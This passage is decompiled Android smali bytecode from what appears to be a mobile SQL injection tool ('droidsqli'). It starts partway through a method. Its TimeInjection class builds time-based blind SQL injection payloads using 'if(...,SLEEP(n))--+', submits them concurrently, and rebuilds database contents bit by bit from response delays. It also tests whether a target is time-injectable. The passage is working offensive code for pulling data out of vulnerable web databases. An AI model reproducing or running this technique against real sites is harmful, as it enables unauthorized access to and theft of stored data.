    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    move-object/from16 v0, p0

    iget-wide v0, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->timeMatch:J

    move-wide/from16 v23, v0

    invoke-virtual/range {v22 .. v24}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v22

    const-string v23, "))--+"

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    move-object/from16 v2, v22

    invoke-direct {v0, v1, v2, v11, v5}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;-><init>(Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;Ljava/lang/String;II)V

    move-object/from16 v0, v16

    move-object/from16 v1, v21

    invoke-interface {v0, v1}, Ljava/util/concurrent/CompletionService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 199
    add-int/lit8 v18, v18, 0x1

    goto :goto_4

    .line 211
    .end local v5    # "bit":I
    :cond_6
    invoke-static {v9}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;->access$2(Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;)I

    move-result v18

    add-int/lit8 v18, v18, -0x1

    move/from16 v0, v18

    invoke-interface {v6, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, [C

    .line 213
    .local v10, "e":[C
    const-wide/high16 v18, 0x4020000000000000L    # 8.0

    const-wide/high16 v20, 0x4000000000000000L    # 2.0

    invoke-static/range {v20 .. v21}, Ljava/lang/Math;->log(D)D

    move-result-wide v20

    invoke-static {v9}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;->access$3(Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;)I

    move-result v22

    move/from16 v0, v22

    int-to-double v0, v0

    move-wide/from16 v22, v0

    invoke-static/range {v22 .. v23}, Ljava/lang/Math;->log(D)D

    move-result-wide v22

    add-double v20, v20, v22

    const-wide/high16 v22, 0x4000000000000000L    # 2.0

    invoke-static/range {v22 .. v23}, Ljava/lang/Math;->log(D)D

    move-result-wide v22

    div-double v20, v20, v22

    sub-double v18, v18, v20

    move-wide/from16 v0, v18

    double-to-int v0, v0

    move/from16 v19, v0

    invoke-virtual {v9}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;->isTrue()Z

    move-result v18

    if-eqz v18, :cond_7

    const/16 v18, 0x31

    :goto_5
    aput-char v18, v10, v19
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_2 .. :try_end_2} :catch_3

    .line 217
    :try_start_3
    new-instance v18, Ljava/lang/String;

    move-object/from16 v0, v18

    invoke-direct {v0, v10}, Ljava/lang/String;-><init>([C)V

    const/16 v19, 0x2

    invoke-static/range {v18 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I

    move-result v8

    .line 218
    .local v8, "charCode":I
    new-instance v18, Ljava/lang/Character;

    int-to-char v0, v8

    move/from16 v19, v0

    invoke-direct/range {v18 .. v19}, Ljava/lang/Character;-><init>(C)V

    invoke-virtual/range {v18 .. v18}, Ljava/lang/Character;->toString()Ljava/lang/String;

    move-result-object v13

    .line 219
    .local v13, "str":Ljava/lang/String;
    new-instance v18, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    move-object/from16 v19, v0

    invoke-virtual/range {v19 .. v19}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v20, "binary-message"

    new-instance v21, Ljava/lang/StringBuilder;

    const-string v22, "\t"

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v22, Ljava/lang/String;

    move-object/from16 v0, v22

    invoke-direct {v0, v10}, Ljava/lang/String;-><init>([C)V

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, "="

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v18 .. v21}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v18 .. v18}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V
    :try_end_3
    .catch Ljava/lang/NumberFormatException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_3 .. :try_end_3} :catch_3

    goto/16 :goto_0

    .line 220
    .end local v8    # "charCode":I
    .end local v13    # "str":Ljava/lang/String;
    :catch_1
    move-exception v18

    goto/16 :goto_0

    .line 213
    :cond_7
    const/16 v18, 0x30

    goto :goto_5

    .line 222
    .end local v9    # "currentCallable":Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;
    .end local v10    # "e":[C
    :catch_2
    move-exception v10

    .line 223
    .local v10, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v10}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_0

    .line 224
    .end local v10    # "e":Ljava/lang/InterruptedException;
    :catch_3
    move-exception v10

    .line 225
    .local v10, "e":Ljava/util/concurrent/ExecutionException;
    invoke-virtual {v10}, Ljava/util/concurrent/ExecutionException;->printStackTrace()V

    goto/16 :goto_0

    .line 233
    .end local v10    # "e":Ljava/util/concurrent/ExecutionException;
    :catch_4
    move-exception v10

    .line 234
    .local v10, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v10}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_1

    .line 239
    .end local v10    # "e":Ljava/lang/InterruptedException;
    .restart local v12    # "result":Ljava/lang/String;
    :cond_8
    invoke-interface/range {v18 .. v18}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, [C

    .line 240
    .local v7, "c":[C
    new-instance v19, Ljava/lang/String;

    move-object/from16 v0, v19

    invoke-direct {v0, v7}, Ljava/lang/String;-><init>([C)V

    const/16 v20, 0x2

    invoke-static/range {v19 .. v20}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I

    move-result v8

    .line 241
    .restart local v8    # "charCode":I
    new-instance v19, Ljava/lang/Character;

    int-to-char v0, v8

    move/from16 v20, v0

    invoke-direct/range {v19 .. v20}, Ljava/lang/Character;-><init>(C)V

    invoke-virtual/range {v19 .. v19}, Ljava/lang/Character;->toString()Ljava/lang/String;

    move-result-object v13

    .line 242
    .restart local v13    # "str":Ljava/lang/String;
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v12}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    goto/16 :goto_2

    .line 195
    :array_0
    .array-data 2
        0x78s
        0x78s
        0x78s
        0x78s
        0x78s
        0x78s
        0x78s
        0x78s
    .end array-data

    .line 199
    :array_1
    .array-data 4
        0x1
        0x2
        0x4
        0x8
        0x10
        0x20
        0x40
        0x80
    .end array-data
.end method

.method public isTimeInjectable()Z
    .locals 5
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;
        }
    .end annotation

    .prologue
    .line 325
    iget-object v2, p0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->injectionModel:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-boolean v2, v2, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->stopFlag:Z

    if-eqz v2, :cond_0

    .line 326
    new-instance v2, Lnet/edgard/droidsqli/exception/PreparationException;

    invoke-direct {v2}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>()V

    throw v2

    .line 328
    :cond_0
    new-instance v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "+and+if(0%2b1=1,1,SLEEP("

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-wide v3, p0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->timeMatch:J

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "))--+"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, p0, v2}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;-><init>(Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;Ljava/lang/String;)V

    .line 330
    .local v0, "blindTest":Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;
    :try_start_0
    invoke-virtual {v0}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;->call()Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 335
    :goto_0
    iget-boolean v2, p0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->isTimeInjectable:Z

    if-eqz v2, :cond_1

    invoke-virtual {v0}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection$TimeCallable;->isTrue()Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v2, 0x1

    :goto_1
    return v2

    .line 331
    :catch_0
    move-exception v1

    .line 332
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 335
    .end local v1    # "e":Ljava/lang/Exception;
    :cond_1
    const/4 v2, 0x0

    goto :goto_1
.end method
